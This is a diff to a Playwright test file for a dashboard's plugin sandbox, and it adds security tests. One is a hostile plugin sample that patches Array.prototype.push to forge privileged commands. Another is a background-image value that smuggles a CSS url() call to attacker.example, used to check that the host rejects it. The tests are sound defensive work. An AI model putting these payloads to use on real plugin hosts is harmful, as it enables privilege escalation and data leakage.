@@ -243,6 +243,24 @@ test("a command the plugin was not granted never reaches the engine", async ({ p
   await expect(page.getByText("without permission")).toBeVisible();
 });
 
+const FORGED_LINK = `
+const push = Array.prototype.push;
+Array.prototype.push = function (effect) {
+  if (effect && effect.kind === "link") effect.action = this.length ? "call" : "remove";
+  return push.call(this, effect);
+};
+plugin.render((ctx) => { ctx.call({ to: "other", channel: "now" }); ctx.call({ to: "other", channel: "now" }); return { type: "text", value: "drawn" }; });
+`;
+
+test("a link effect reaches only the commands that talk to plugins", async ({ page }) => {
+  await dashboardWithPlugin(page, FORGED_LINK);
+
+  await expect(page.getByText("drawn")).toBeVisible();
+  const sent = await page.evaluate(() => (window as any).__sent.map((c: any) => c.cmd));
+  expect(sent).toContain("plugin.call");
+  expect(sent).not.toContain("plugin.remove");
+});
+
 async function stubFloat(page: import("@playwright/test").Page) {
   await page.addInitScript(() => {
     const win = window as any;
@@ -410,7 +428,7 @@ test("glass takes the text colour its tone can carry", async ({ page }) => {
     });
   const wear = (opacity: number, tone: number) =>
     page.evaluate(async (glass) => {
-      const { applyTheme } = await import("/src/theme.ts");
+      const { applyTheme } = await import("/src/theme.ts" as string);
       applyTheme("glass", [], glass);
     }, { opacity, tone });
 
@@ -423,6 +441,7 @@ test("glass takes the text colour its tone can carry", async ({ page }) => {
 
 
 test("an event never wipes the per-monitor views the plugin drew", async ({ page }) => {
+  await stubFloat(page);
   await dashboardWithPlugin(page, `${MONITOR_PIP}\nplugin.on('result', () => {});`, PLUGIN.granted, ["monitor"]);
   const float = page.getByRole("button", { name: "Float Bench" });
 
@@ -450,4 +469,19 @@ test("a float node in a panel floats without a round trip to the sandbox", async
 
   expect(await page.evaluate(() => (window as any).__sent.filter((c: any) => c.cmd === "plugin.act").length)).toBe(0);
   expect(await page.evaluate(() => (window as any).__floated)).toBe(1);
+});
+
+test("a background is only ever a base64 picture, so it cannot smuggle a second address", async ({ page }) => {
+  await dashboardWithPlugin(page, PIP, ["background"]);
+  const picture = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
+  const paint = (image: string) =>
+    page.evaluate((image) => {
+      const win = window as any;
+      win.__pgEvent({ event: "plugin_effect", id: "pip", effect: { kind: "background", image } });
+      return win.__pg.getState().background?.image ?? null;
+    }, image);
+
+  expect(await paint(picture)).toBe(picture);
+  expect(await paint('data:image/png;base64,AAAA"), url("https://attacker.example/?d=1')).toBeNull();
+  expect(await paint("data:image/svg+xml;base64,PHN2Zy8+")).toBeNull();
 });
